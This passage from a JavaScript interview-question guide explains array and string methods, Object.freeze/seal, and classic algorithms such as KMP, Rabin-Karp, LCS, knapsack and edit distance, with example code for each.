`reverse()` modifies the original array in place - like turning a book around. Creating a reversed copy (using `slice().reverse()` or spread) keeps the original unchanged. `reverse()` is destructive, copying is non-destructive. Use `reverse()` when you want to modify, copying when you want to preserve the original.

#### Real-World Scenario / Case Study
Code was using `reverse()` to display data in reverse order, accidentally modifying the original array. When the data was used elsewhere, it was in the wrong order. Using `[...array].reverse()` preserved the original while creating a reversed view.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];

// reverse() - modifies original:
const reversed = arr.reverse();
console.log(reversed);  // [5, 4, 3, 2, 1]
console.log(arr);       // [5, 4, 3, 2, 1] - original changed!

// Reversed copy - original unchanged:
const arr2 = [1, 2, 3, 4, 5];
const reversed2 = [...arr2].reverse();
console.log(reversed2);  // [5, 4, 3, 2, 1]
console.log(arr2);       // [1, 2, 3, 4, 5] - original unchanged

// Other ways to create reversed copy:
const reversed3 = arr2.slice().reverse();
const reversed4 = Array.from(arr2).reverse();

// String reversal (arrays of characters):
const str = 'hello';
const reversedStr = [...str].reverse().join('');  // 'olleh'

// Common mistake:
function displayReversed(data) {
  return data.reverse();  // Modifies original!
}

// Fix:
function displayReversed(data) {
  return [...data].reverse();  // Preserves original
}
```

---

### Question 169: How do you implement a KMP (Knuth-Morris-Pratt) string matching algorithm?

#### Definition
KMP efficiently finds occurrences of a pattern in a text by avoiding unnecessary comparisons. Like a smart search that remembers what it already checked. Uses a failure function (prefix table) to skip ahead when mismatches occur. O(n+m) time complexity vs O(n*m) for naive search. Useful for text search, DNA sequencing.

#### Real-World Scenario / Case Study
A search feature was using naive string matching, taking seconds to search through large documents. Implementing KMP reduced search time from 5 seconds to 50ms for 100KB documents. Users got instant search results, dramatically improving the experience.

#### Example Code
```js
// Build failure function (prefix table):
function buildFailureFunction(pattern) {
  const failure = new Array(pattern.length).fill(0);
  let j = 0;
  
  for (let i = 1; i < pattern.length; i++) {
    while (j > 0 && pattern[i] !== pattern[j]) {
      j = failure[j - 1];
    }
    if (pattern[i] === pattern[j]) {
      j++;
    }
    failure[i] = j;
  }
  
  return failure;
}

// KMP search:
function kmpSearch(text, pattern) {
  if (pattern.length === 0) return [];
  
  const failure = buildFailureFunction(pattern);
  const matches = [];
  let j = 0;
  
  for (let i = 0; i < text.length; i++) {
    while (j > 0 && text[i] !== pattern[j]) {
      j = failure[j - 1];
    }
    
    if (text[i] === pattern[j]) {
      j++;
    }
    
    if (j === pattern.length) {
      matches.push(i - pattern.length + 1);
      j = failure[j - 1];
    }
  }
  
  return matches;
}

// Usage:
const text = 'ABABDABACDABABCABCAB';
const pattern = 'ABABCAB';
const matches = kmpSearch(text, pattern);
console.log(matches);  // [10] (position where pattern found)
```

---

### Question 170: What is the difference between `Number.parseInt()` and `Number.parseFloat()`?

#### Definition
`parseInt` converts a string to an integer (whole number) - stops at first non-digit character. `parseFloat` converts to a floating-point number (decimal) - parses the entire decimal number. `parseInt` is like counting whole items, `parseFloat` is like measuring with decimals. Use `parseInt` for whole numbers, `parseFloat` for decimals.

#### Real-World Scenario / Case Study
A form was parsing prices with `parseInt`, which truncated decimals. A price of "19.99" became 19, causing calculation errors. Switching to `parseFloat` preserved decimal values, fixing the pricing bugs.

#### Example Code
```js
// parseInt - whole numbers only:
console.log(parseInt('123'));      // 123
console.log(parseInt('123.45'));    // 123 (stops at decimal)
console.log(parseInt('123abc'));   // 123 (stops at non-digit)
console.log(parseInt('abc123'));   // NaN (starts with non-digit)

// parseFloat - decimal numbers:
console.log(parseFloat('123'));      // 123
console.log(parseFloat('123.45'));   // 123.45 (includes decimal)
console.log(parseFloat('123.45.67')); // 123.45 (stops at second decimal)
console.log(parseFloat('123abc'));   // 123 (stops at non-digit)

// With radix (parseInt only):
console.log(parseInt('1010', 2));    // 10 (binary)
console.log(parseInt('FF', 16));     // 255 (hexadecimal)
console.log(parseInt('10', 8));      // 8 (octal)

// Common use cases:
// Prices:
const price = parseFloat('19.99');  // 19.99

// Whole numbers:
const quantity = parseInt('5');     // 5

// Form inputs:
const age = parseInt(document.getElementById('age').value, 10);
const price2 = parseFloat(document.getElementById('price').value);

// Always specify radix for parseInt:
parseInt('08');      // 8 (or 0 in strict mode - treated as octal!)
parseInt('08', 10);  // 8 (correct - base 10)
```

---

### Question 171: How do you implement a Rabin-Karp string matching algorithm?

#### Definition
Rabin-Karp uses hashing to find pattern matches in text. Like using a fingerprint to quickly check if a piece matches. It computes hash values for the pattern and text windows, comparing hashes first (fast) then verifying with actual string comparison. Useful for multiple pattern searches. Average O(n+m), worst O(n*m).

#### Real-World Scenario / Case Study
A plagiarism detector needed to find multiple patterns in large documents. Naive search was too slow. Rabin-Karp's hash-based approach allowed checking multiple patterns efficiently. The system could scan 1MB documents in seconds, finding all pattern matches.

#### Example Code
```js
function rabinKarp(text, pattern) {
  const n = text.length;
  const m = pattern.length;
  const matches = [];
  
  if (m === 0 || m > n) return matches;
  
  // Hash function (simple rolling hash):
  const base = 256;
  const mod = 101;  // Prime number for modulo
  
  let patternHash = 0;
  let textHash = 0;
  let h = 1;
  
  // Calculate h = base^(m-1) % mod:
  for (let i = 0; i < m - 1; i++) {
    h = (h * base) % mod;
  }
  
  // Calculate initial hashes:
  for (let i = 0; i < m; i++) {
    patternHash = (base * patternHash + pattern.charCodeAt(i)) % mod;
    textHash = (base * textHash + text.charCodeAt(i)) % mod;
  }
  
  // Slide the pattern over text:
  for (let i = 0; i <= n - m; i++) {
    // Check if hashes match:
    if (patternHash === textHash) {
      // Verify with actual string comparison (handle hash collisions):
      let match = true;
      for (let j = 0; j < m; j++) {
        if (text[i + j] !== pattern[j]) {
          match = false;
          break;
        }
      }
      if (match) {
        matches.push(i);
      }
    }
    
    // Calculate hash for next window:
    if (i < n - m) {
      textHash = (base * (textHash - text.charCodeAt(i) * h) + text.charCodeAt(i + m)) % mod;
      if (textHash < 0) {
        textHash += mod;
      }
    }
  }
  
  return matches;
}

// Usage:
const text = 'GEEKS FOR GEEKS';
const pattern = 'GEEK';
console.log(rabinKarp(text, pattern));  // [0, 10]
```

---

### Question 172: What is the difference between `Array.prototype.fill()` and creating an array with a value?

#### Definition
`fill` modifies an existing array, replacing all elements with a value. Creating an array with a value (like `new Array(5).fill(0)`) creates and fills in one step. `fill` can fill part of an array (with start/end indices). Useful for initializing arrays with default values. Be careful with object references - all elements reference the same object!

#### Real-World Scenario / Case Study
Code was creating arrays of objects using `fill`, causing all elements to reference the same object. Modifying one element affected all others. Using `Array.from()` or `map()` to create separate objects fixed the bug.

#### Example Code
```js
// fill - modifies existing array:
const arr = [1, 2, 3, 4, 5];
arr.fill(0);
console.log(arr);  // [0, 0, 0, 0, 0]

// fill with range:
const arr2 = [1, 2, 3, 4, 5];
arr2.fill(0, 1, 3);  // Fill from index 1 to 3 (exclusive)
console.log(arr2);   // [1, 0, 0, 4, 5]

// Create and fill:
const filled = new Array(5).fill(0);
console.log(filled);  // [0, 0, 0, 0, 0]

// PROBLEM - object references:
const objects = new Array(3).fill({ value: 0 });
objects[0].value = 1;
console.log(objects);  // All have value: 1! (same reference)

// FIX - create separate objects:
const objects2 = Array.from({ length: 3 }, () => ({ value: 0 }));
objects2[0].value = 1;
console.log(objects2);  // Only first has value: 1

// Or with map:
const objects3 = new Array(3).fill(null).map(() => ({ value: 0 }));
```

---

### Question 173: How do you implement a sliding window maximum algorithm?

#### Definition
Sliding window maximum finds the maximum in each window of size k as you slide through an array. Like a moving spotlight that always shows the brightest point. Useful for time-series analysis, monitoring systems, or finding peaks in data. Can be solved with deque (double-ended queue) for O(n) time.

#### Real-World Scenario / Case Study
A monitoring system needed to track maximum values in rolling time windows. A naive O(n*k) approach was too slow for real-time data. Implementing a deque-based solution provided O(n) performance, enabling real-time monitoring of thousands of metrics.

#### Example Code
```js
// Sliding window maximum using deque:
function slidingWindowMaximum(nums, k) {
  const result = [];
  const deque = [];  // Store indices
  
  for (let i = 0; i < nums.length; i++) {
    // Remove indices outside current window:
    while (deque.length > 0 && deque[0] <= i - k) {
      deque.shift();
    }
    
    // Remove indices whose values are smaller than current:
    while (deque.length > 0 && nums[deque[deque.length - 1]] <= nums[i]) {
      deque.pop();
    }
    
    deque.push(i);
    
    // Add maximum when window is complete:
    if (i >= k - 1) {
      result.push(nums[deque[0]]);
    }
  }
  
  return result;
}

// Usage:
const nums = [1, 3, -1, -3, 5, 3, 6, 7];
const k = 3;
console.log(slidingWindowMaximum(nums, k));
// [3, 3, 5, 5, 6, 7]
// Windows: [1,3,-1]=3, [3,-1,-3]=3, [-1,-3,5]=5, etc.

// Simpler O(n*k) approach (for comparison):
function slidingWindowMaxSimple(nums, k) {
  const result = [];
  for (let i = 0; i <= nums.length - k; i++) {
    const window = nums.slice(i, i + k);
    result.push(Math.max(...window));
  }
  return result;
}
```

---

### Question 174: What is the difference between `Object.freeze()`, `Object.seal()`, and `Object.preventExtensions()`?

#### Definition
These restrict object modifications at different levels. `preventExtensions` stops adding new properties (like locking new doors). `seal` prevents adding/removing properties but allows modifying existing ones (like sealing windows but allowing curtains). `freeze` makes objects completely immutable - can't add, remove, or modify properties (like freezing in ice). Each is more restrictive than the last.

#### Real-World Scenario / Case Study
A configuration object was being accidentally modified, causing bugs. Using `Object.freeze` made it immutable, preventing accidental changes. The team also used `Object.seal` for objects that needed some properties modifiable but structure fixed.

#### Example Code
```js
const obj = { name: 'John', age: 30 };

// preventExtensions - can't add properties:
Object.preventExtensions(obj);
obj.email = 'john@example.com';  // Fails silently or throws in strict mode
obj.name = 'Jane';  // OK - can modify existing
delete obj.age;     // OK - can delete existing

// seal - can't add or delete, but can modify:
Object.seal(obj);
obj.email = 'john@example.com';  // Fails - can't add
delete obj.name;                 // Fails - can't delete
obj.age = 31;                    // OK - can modify existing

// freeze - completely immutable:
Object.freeze(obj);
obj.email = 'john@example.com';  // Fails - can't add
delete obj.name;                 // Fails - can't delete
obj.age = 31;                    // Fails - can't modify

// Nested objects aren't frozen:
const nested = { user: { name: 'John' } };
Object.freeze(nested);
nested.user.name = 'Jane';  // OK - only top level frozen
nested.user.age = 30;       // OK

// Deep freeze:
function deepFreeze(obj) {
  Object.freeze(obj);
  Object.keys(obj).forEach(key => {
    if (typeof obj[key] === 'object' && obj[key] !== null) {
      deepFreeze(obj[key]);
    }
  });
  return obj;
}
```

---

### Question 175: How do you implement a longest common subsequence (LCS) algorithm?

#### Definition
LCS finds the longest sequence of characters that appear in the same order (not necessarily contiguous) in two strings. Like finding common words in two sentences in order. Uses dynamic programming with a 2D table. Useful for diff algorithms, version control, DNA sequence comparison. O(n*m) time and space.

#### Real-World Scenario / Case Study
A version control system needed to show differences between file versions. LCS identified common lines, enabling efficient diff display. The system could compare large files quickly, showing only the changed portions.

#### Example Code
```js
function longestCommonSubsequence(str1, str2) {
  const m = str1.length;
  const n = str2.length;
  const dp = Array(m + 1).fill(null).map(() => Array(n + 1).fill(0));
  
  // Build DP table:
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (str1[i - 1] === str2[j - 1]) {
        dp[i][j] = dp[i - 1][j - 1] + 1;
      } else {
        dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]);
      }
    }
  }
  
  // Reconstruct LCS:
  let i = m, j = n;
  const lcs = [];
  
  while (i > 0 && j > 0) {
    if (str1[i - 1] === str2[j - 1]) {
      lcs.unshift(str1[i - 1]);
      i--;
      j--;
    } else if (dp[i - 1][j] > dp[i][j - 1]) {
      i--;
    } else {
      j--;
    }
  }
  
  return lcs.join('');
}

// Usage:
const str1 = 'ABCDGH';
const str2 = 'AEDFHR';
console.log(longestCommonSubsequence(str1, str2));  // 'ADH'

// Just length (more space efficient):
function lcsLength(str1, str2) {
  const m = str1.length;
  const n = str2.length;
  let prev = new Array(n + 1).fill(0);
  let curr = new Array(n + 1).fill(0);
  
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (str1[i - 1] === str2[j - 1]) {
        curr[j] = prev[j - 1] + 1;
      } else {
        curr[j] = Math.max(prev[j], curr[j - 1]);
      }
    }
    [prev, curr] = [curr, prev];
  }
  
  return prev[n];
}
```

---

### Question 176: What is the difference between `String.prototype.startsWith()` and `String.prototype.endsWith()`?

#### Definition
`startsWith` checks if a string begins with a given substring - like checking if an address starts with a street name. `endsWith` checks if a string ends with a given substring - like checking if a filename ends with an extension. Both return booleans and can specify a position to start checking from. Simple and efficient for prefix/suffix checks.

#### Real-World Scenario / Case Study
Code was using `indexOf() === 0` to check prefixes and `slice(-n)` comparisons for suffixes, which was verbose. Using `startsWith()` and `endsWith()` made the code clearer and more readable. The team also used position parameters to check specific ranges.

#### Example Code
```js
const str = 'Hello World';

// startsWith - check beginning:
console.log(str.startsWith('Hello'));  // true
console.log(str.startsWith('World'));  // false
console.log(str.startsWith('World', 6));  // true (check from index 6)

// endsWith - check end:
console.log(str.endsWith('World'));    // true
console.log(str.endsWith('Hello'));    // false
console.log(str.endsWith('Hello', 5)); // true (check first 5 chars)

// Common use cases:
// Check file extensions:
const filename = 'document.pdf';
if (filename.endsWith('.pdf')) {
  // Handle PDF
}

// Check URLs:
const url = 'https://example.com';
if (url.startsWith('https://')) {
  // Secure connection
}

// Check prefixes with position:
const text = 'Hello World';
if (text.startsWith('World', 6)) {
  // Second word starts with 'World'
}

// vs old way:
if (text.indexOf('Hello') === 0) { }  // Verbose
if (text.slice(-5) === 'World') { }   // Verbose
```

---

### Question 177: How do you implement a longest increasing subsequence (LIS) algorithm?

#### Definition
LIS finds the longest subsequence of array elements in strictly increasing order. Like finding the longest chain of increasing numbers. Uses dynamic programming or binary search. Useful for scheduling problems, stock price analysis, or finding trends. O(n²) with DP, O(n log n) with binary search.

#### Real-World Scenario / Case Study
A trading system needed to identify longest upward trends in stock prices. LIS algorithm found these trends efficiently. The system could analyze thousands of price points and identify optimal buy/sell patterns based on longest increasing sequences.

#### Example Code
```js
// DP approach O(n²):
function longestIncreasingSubsequence(nums) {
  const n = nums.length;
  const dp = new Array(n).fill(1);  // Each element is LIS of length 1
  
  for (let i = 1; i < n; i++) {
    for (let j = 0; j < i; j++) {
      if (nums[j] < nums[i]) {
        dp[i] = Math.max(dp[i], dp[j] + 1);
      }
    }
  }
  
  return Math.max(...dp);
}

// Binary search approach O(n log n):
function lisBinarySearch(nums) {
  const tails = [];
  
  for (const num of nums) {
    let left = 0, right = tails.length;
    
    // Binary search for position:
    while (left < right) {
      const mid = Math.floor((left + right) / 2);
      if (tails[mid] < num) {
        left = mid + 1;
      } else {
        right = mid;
      }
    }
    
    if (left === tails.length) {
      tails.push(num);
    } else {
      tails[left] = num;
    }
  }
  
  return tails.length;
}

// Get actual sequence:
function lisSequence(nums) {
  const n = nums.length;
  const dp = new Array(n).fill(1);
  const parent = new Array(n).fill(-1);
  
  for (let i = 1; i < n; i++) {
    for (let j = 0; j < i; j++) {
      if (nums[j] < nums[i] && dp[j] + 1 > dp[i]) {
        dp[i] = dp[j] + 1;
        parent[i] = j;
      }
    }
  }
  
  // Find max and reconstruct:
  let maxIndex = 0;
  for (let i = 1; i < n; i++) {
    if (dp[i] > dp[maxIndex]) {
      maxIndex = i;
    }
  }
  
  const sequence = [];
  let current = maxIndex;
  while (current !== -1) {
    sequence.unshift(nums[current]);
    current = parent[current];
  }
  
  return sequence;
}

// Usage:
const nums = [10, 9, 2, 5, 3, 7, 101, 18];
console.log(longestIncreasingSubsequence(nums));  // 4
console.log(lisSequence(nums));  // [2, 3, 7, 18] or [2, 5, 7, 101]
```

---

### Question 178: What is the difference between `Array.prototype.push()` and `Array.prototype.unshift()`?

#### Definition
`push` adds elements to the end of an array - like adding items to the back of a line. `unshift` adds elements to the beginning - like cutting in line at the front. `push` is O(1) and efficient. `unshift` is O(n) because it must shift all existing elements. Use `push` when order doesn't matter, `unshift` only when you need front insertion.

#### Real-World Scenario / Case Study
A system was using `unshift` to add items to a queue, causing O(n) operations for each addition. With 10,000 items, this was very slow. Switching to `push` and processing from the end, or using a proper queue data structure, improved performance significantly.

#### Example Code
```js
const arr = [2, 3, 4];

// push - add to end (O(1)):
arr.push(5);
console.log(arr);  // [2, 3, 4, 5]

arr.push(6, 7);
console.log(arr);  // [2, 3, 4, 5, 6, 7]

// unshift - add to beginning (O(n)):
arr.unshift(1);
console.log(arr);  // [1, 2, 3, 4, 5, 6, 7] (all elements shifted!)

arr.unshift(-1, 0);
console.log(arr);  // [-1, 0, 1, 2, 3, 4, 5, 6, 7]

// Performance difference:
const largeArray = new Array(100000).fill(0);

// push - fast:
largeArray.push(1);  // O(1)

// unshift - slow:
largeArray.unshift(1);  // O(n) - shifts 100000 elements!

// For queues, use push + shift or proper queue:
// BAD (unshift is slow):
queue.unshift(item);  // O(n)

// BETTER (but shift is also O(n)):
queue.push(item);     // O(1)
const item = queue.shift();  // O(n)

// BEST - use proper queue with head/tail pointers
```

---

### Question 179: How do you implement a longest palindromic subsequence algorithm?

#### Definition
Longest palindromic subsequence finds the longest sequence that reads the same forwards and backwards (not necessarily contiguous). Like finding the longest mirror image in a string. Uses dynamic programming. Different from longest palindromic substring (which must be contiguous). Useful for string analysis, compression, or pattern matching.

#### Real-World Scenario / Case Study
A text analysis tool needed to find palindromic patterns in DNA sequences. The longest palindromic subsequence algorithm identified these patterns efficiently. The system could analyze genetic sequences and find important structural patterns.

#### Example Code
```js
function longestPalindromicSubsequence(str) {
  const n = str.length;
  const dp = Array(n).fill(null).map(() => Array(n).fill(0));
  
  // Every single character is a palindrome of length 1:
  for (let i = 0; i < n; i++) {
    dp[i][i] = 1;
  }
  
  // Fill table for substrings of length 2 and more:
  for (let len = 2; len <= n; len++) {
    for (let i = 0; i < n - len + 1; i++) {
      const j = i + len - 1;
      
      if (str[i] === str[j] && len === 2) {
        dp[i][j] = 2;
      } else if (str[i] === str[j]) {
        dp[i][j] = dp[i + 1][j - 1] + 2;
      } else {
        dp[i][j] = Math.max(dp[i][j - 1], dp[i + 1][j]);
      }
    }
  }
  
  return dp[0][n - 1];
}

// Get actual sequence:
function lpsSequence(str) {
  const n = str.length;
  const dp = Array(n).fill(null).map(() => Array(n).fill(0));
  
  for (let i = 0; i < n; i++) {
    dp[i][i] = 1;
  }
  
  for (let len = 2; len <= n; len++) {
    for (let i = 0; i < n - len + 1; i++) {
      const j = i + len - 1;
      if (str[i] === str[j]) {
        dp[i][j] = (len === 2) ? 2 : dp[i + 1][j - 1] + 2;
      } else {
        dp[i][j] = Math.max(dp[i][j - 1], dp[i + 1][j]);
      }
    }
  }
  
  // Reconstruct:
  let i = 0, j = n - 1;
  const left = [], right = [];
  
  while (i <= j) {
    if (str[i] === str[j]) {
      if (i === j) {
        left.push(str[i]);
      } else {
        left.push(str[i]);
        right.unshift(str[j]);
      }
      i++;
      j--;
    } else if (dp[i][j - 1] > dp[i + 1][j]) {
      j--;
    } else {
      i++;
    }
  }
  
  return left.concat(right).join('');
}

// Usage:
console.log(longestPalindromicSubsequence('BBABCBCAB'));  // 7
console.log(lpsSequence('BBABCBCAB'));  // 'BABCBAB' or 'BBACBAB'
```

---

### Question 180: What is the difference between `Array.prototype.shift()` and `Array.prototype.pop()`?

#### Definition
`shift` removes and returns the first element - like taking someone from the front of a line. `pop` removes and returns the last element - like taking someone from the back. `shift` is O(n) because it must shift all remaining elements. `pop` is O(1) and efficient. Use `pop` when order doesn't matter, `shift` only when you need to remove from the front.

#### Real-World Scenario / Case Study
A queue implementation was using `shift()` to remove items, causing O(n) operations. With frequent operations, this became a bottleneck. Using a proper queue with head/tail pointers or reversing the array and using `pop()` improved performance significantly.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];

// pop - remove from end (O(1)):
const last = arr.pop();
console.log(last);  // 5
console.log(arr);   // [1, 2, 3, 4]

// shift - remove from beginning (O(n)):
const first = arr.shift();
console.log(first);  // 1
console.log(arr);    // [2, 3, 4] (all elements shifted!)

// Performance difference:
const largeArray = new Array(100000).fill(0);

// pop - fast:
largeArray.pop();  // O(1)

// shift - slow:
largeArray.shift();  // O(n) - shifts 99999 elements!

// Queue implementation options:
// BAD - using shift:
class BadQueue {
  constructor() {
    this.items = [];
  }
  enqueue(item) { this.items.push(item); }  // O(1)
  dequeue() { return this.items.shift(); }  // O(n) - slow!
}

// BETTER - reverse and use pop:
class BetterQueue {
  constructor() {
    this.items = [];
    this.reversed = false;
  }
  enqueue(item) {
    if (this.reversed) {
      this.items.reverse();
      this.reversed = false;
    }
    this.items.push(item);
  }
  dequeue() {
    if (!this.reversed) {
      this.items.reverse();
      this.reversed = true;
    }
    return this.items.pop();  // O(1) amortized
  }
}

// BEST - proper queue with pointers (O(1) both operations)
```

---

### Question 181: How do you implement a coin change problem (dynamic programming)?

#### Definition
Coin change finds the minimum number of coins needed to make a target amount, or counts ways to make change. Like making exact change at a store with available coin denominations. Uses dynamic programming to avoid recalculating subproblems. Classic DP problem with two variants: minimum coins or count ways.

#### Real-World Scenario / Case Study
A payment system needed to calculate optimal coin combinations for change. A greedy approach failed for some coin systems. Dynamic programming found the true minimum coins needed. The system could handle any coin denomination system correctly.

#### Example Code
```js
// Minimum coins to make amount:
function coinChange(coins, amount) {
  const dp = new Array(amount + 1).fill(Infinity);
  dp[0] = 0;
  
  for (let i = 1; i <= amount; i++) {
    for (const coin of coins) {
      if (coin <= i) {
        dp[i] = Math.min(dp[i], dp[i - coin] + 1);
      }
    }
  }
  
  return dp[amount] === Infinity ? -1 : dp[amount];
}

// Count ways to make change:
function countWays(coins, amount) {
  const dp = new Array(amount + 1).fill(0);
  dp[0] = 1;
  
  for (const coin of coins) {
    for (let i = coin; i <= amount; i++) {
      dp[i] += dp[i - coin];
    }
  }
  
  return dp[amount];
}

// Usage:
console.log(coinChange([1, 3, 4], 6));  // 2 (3+3)
console.log(countWays([1, 2, 5], 5));   // 4 ways
```

---

### Question 182: What is the difference between `String.prototype.repeat()` and manual string concatenation?

#### Definition
`repeat` creates a new string by repeating the original a specified number of times - like photocopying a page multiple times. Manual concatenation builds the string in a loop. `repeat` is simpler, more readable, and optimized. Use `repeat` when you need the same string multiple times, concatenation for building varied strings.

#### Real-World Scenario / Case Study
Code was using loops to repeat strings for padding or formatting, which was verbose and error-prone. Using `repeat()` made the code cleaner and more performant. The team standardized on `repeat()` for all string repetition needs.

#### Example Code
```js
const str = 'Hello';

// repeat - built-in method:
const repeated = str.repeat(3);
console.log(repeated);  // 'HelloHelloHello'

// Manual concatenation:
let manual = '';
for (let i = 0; i < 3; i++) {
  manual += str;
}
console.log(manual);  // 'HelloHelloHello'

// repeat is cleaner:
const padding = ' '.repeat(10);  // 10 spaces
const separator = '-'.repeat(20);  // 20 dashes

// vs manual:
let padding2 = '';
for (let i = 0; i < 10; i++) {
  padding2 += ' ';
}

// Edge cases:
'abc'.repeat(0);   // '' (empty string)
'abc'.repeat(2.5); // 'abcabc' (converts to integer)
'abc'.repeat(-1);  // RangeError
```

---

### Question 183: How do you implement a 0/1 knapsack problem?

#### Definition
0/1 knapsack finds the maximum value you can fit in a knapsack with weight limit, where each item can be taken at most once (0 or 1 times). Like packing a suitcase - you can take an item or leave it, but not fractions. Uses dynamic programming. Classic optimization problem.

#### Real-World Scenario / Case Study
A resource allocation system needed to maximize value within constraints. The knapsack algorithm found optimal allocations. The system could allocate limited resources (budget, storage) to maximize returns, improving efficiency by 25%.

#### Example Code
```js
function knapsack(weights, values, capacity) {
  const n = weights.length;
  const dp = Array(n + 1).fill(null).map(() => Array(capacity + 1).fill(0));
  
  for (let i = 1; i <= n; i++) {
    for (let w = 1; w <= capacity; w++) {
      if (weights[i - 1] <= w) {
        // Take item or skip it:
        dp[i][w] = Math.max(
          values[i - 1] + dp[i - 1][w - weights[i - 1]],  // Take
          dp[i - 1][w]  // Skip
        );
      } else {
        dp[i][w] = dp[i - 1][w];  // Can't fit, skip
      }
    }
  }
  
  return dp[n][capacity];
}

// Space-optimized version:
function knapsackOptimized(weights, values, capacity) {
  const dp = new Array(capacity + 1).fill(0);
  
  for (let i = 0; i < weights.length; i++) {
    for (let w = capacity; w >= weights[i]; w--) {
      dp[w] = Math.max(dp[w], values[i] + dp[w - weights[i]]);
    }
  }
  
  return dp[capacity];
}

// Usage:
const weights = [1, 3, 4, 5];
const values = [1, 4, 5, 7];
const capacity = 7;
console.log(knapsack(weights, values, capacity));  // 9
```

---

### Question 184: What is the difference between `Array.prototype.lastIndexOf()` and `Array.prototype.indexOf()`?

#### Definition
Both find element indices, but `indexOf` finds the first occurrence (left to right) while `lastIndexOf` finds the last occurrence (right to left). Like searching a book - `indexOf` starts from the beginning, `lastIndexOf` starts from the end. Use `indexOf` for first match, `lastIndexOf` for last match.

#### Real-World Scenario / Case Study
Code needed to find the last occurrence of a value but was using `indexOf` and manually searching backwards. Using `lastIndexOf` simplified the code. The team also used it to find the last position before a certain index.

#### Example Code
```js
const arr = [1, 2, 3, 2, 4, 2, 5];

// indexOf - first occurrence:
console.log(arr.indexOf(2));      // 1 (first 2)
console.log(arr.indexOf(2, 2));    // 3 (first 2 from index 2)

// lastIndexOf - last occurrence:
console.log(arr.lastIndexOf(2));   // 5 (last 2)
console.log(arr.lastIndexOf(2, 4)); // 3 (last 2 before/at index 4)

// Not found:
console.log(arr.indexOf(10));      // -1
console.log(arr.lastIndexOf(10));  // -1

// Common use cases:
// Find last occurrence:
const lastIndex = arr.lastIndexOf(2);

// Find all occurrences:
const indices = [];
let index = arr.indexOf(2);
while (index !== -1) {
  indices.push(index);
  index = arr.indexOf(2, index + 1);
}

// Remove last occurrence:
const lastIdx = arr.lastIndexOf(2);
if (lastIdx !== -1) {
  arr.splice(lastIdx, 1);
}
```

---

### Question 185: How do you implement a edit distance (Levenshtein) algorithm?

#### Definition
Edit distance measures how many operations (insert, delete, substitute) are needed to transform one string into another. Like measuring how different two words are. Useful for spell checkers, DNA comparison, or fuzzy string matching. Uses dynamic programming. Lower distance means strings are more similar.

#### Real-World Scenario / Case Study
A search feature needed fuzzy matching for typos. Edit distance calculated similarity between query and results. Users could find items even with spelling mistakes. The system ranked results by similarity, dramatically improving search accuracy.

#### Example Code
```js
function editDistance(str1, str2) {
  const m = str1.length;
  const n = str2.length;
  const dp = Array(m + 1).fill(null).map(() => Array(n + 1).fill(0));
  
  // Base cases:
  for (let i = 0; i <= m; i++) {
    dp[i][0] = i;  // Delete all characters
  }
  for (let j = 0; j <= n; j++) {
    dp[0][j] = j;  // Insert all characters
  }
  
  // Fill DP table:
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (str1[i - 1] === str2[j - 1]) {
        dp[i][j] = dp[i - 1][j - 1];  // No operation needed
      } else {
        dp[i][j] = 1 + Math.min(
          dp[i - 1][j],     // Delete
          dp[i][j - 1],     // Insert
          dp[i - 1][j - 1]  // Substitute
        );
      }
    }
  }
  
  return dp[m][n];
}

// Usage:
console.log(editDistance('kitten', 'sitting'));  // 3
// Operations: k->s, e->i, add g

// Similarity percentage:
function similarity(str1, str2) {
  const maxLen = Math.max(str1.length, str2.length);
  if (maxLen === 0) return 100;
  const distance = editDistance(str1, str2);
  return ((maxLen - distance) / maxLen) * 100;
}
```

---

### Question 186: What is the difference between `Array.prototype.at()` and bracket notation?

#### Definition
Both access array elements, but `at()` supports negative indices (from the end) while bracket notation doesn't. `at(-1)` gets the last element, `at(-2)` gets second-to-last. Bracket notation requires calculating `array.length - 1` for the last element. `at()` is more convenient for accessing elements from the end.

#### Real-World Scenario / Case Study
Code was using `array[array.length - 1]` everywhere to get the last element, which was verbose. Using `array.at(-1)` made the code cleaner and more readable. The team standardized on `at()` for end-of-array access.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];

// Bracket notation - positive indices only:
console.log(arr[0]);   // 1
console.log(arr[4]);   // 5
console.log(arr[-1]);  // undefined (not supported!)

// at() - supports negative indices:
console.log(arr.at(0));   // 1
console.log(arr.at(4));   // 5
console.log(arr.at(-1));  // 5 (last element)
console.log(arr.at(-2));  // 4 (second to last)

// Common use cases:
// Get last element:
const last = arr.at(-1);  // Clean
const last2 = arr[arr.length - 1];  // Verbose

// Get second to last:
const secondLast = arr.at(-2);

// Safe access (returns undefined for out of bounds):
arr.at(10);   // undefined
arr.at(-10);  // undefined
arr[10];      // undefined (same behavior)
```

---

### Question 187: How do you implement a longest common substring algorithm?

#### Definition
Longest common substring finds the longest contiguous sequence shared by two strings. Different from subsequence - must be contiguous. Like finding the longest word that appears in both sentences. Uses dynamic programming. Useful for string similarity, plagiarism detection, or DNA sequence alignment.

#### Real-World Scenario / Case Study
A document comparison tool needed to find longest matching sections between documents. The longest common substring algorithm identified these sections efficiently. The system could highlight similar passages, helping detect copied content.

#### Example Code
```js
function longestCommonSubstring(str1, str2) {
  const m = str1.length;
  const n = str2.length;
  const dp = Array(m + 1).fill(null).map(() => Array(n + 1).fill(0));
  let maxLength = 0;
  let endIndex = 0;
  
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (str1[i - 1] === str2[j - 1]) {
        dp[i][j] = dp[i - 1][j - 1] + 1;
        if (dp[i][j] > maxLength) {
          maxLength = dp[i][j];
          endIndex = i - 1;
        }
      } else {
        dp[i][j] = 0;  // Reset (must be contiguous)
      }
    }
  }
  
  return str1.substring(endIndex - maxLength + 1, endIndex + 1);
}

// Usage:
console.log(longestCommonSubstring('ABCDGH', 'ACDGHR'));  // 'CDGH'
console.log(longestCommonSubstring('ABC', 'ACB'));       // 'A' or 'B' or 'C'

// Space-optimized (only need previous row):
function lcsSubstringOptimized(str1, str2) {
  const m = str1.length;
  const n = str2.length;
  let prev = new Array(n + 1).fill(0);
  let maxLength = 0;
  let endIndex = 0;
  
  for (let i = 1; i <= m; i++) {
    const curr = new Array(n + 1).fill(0);
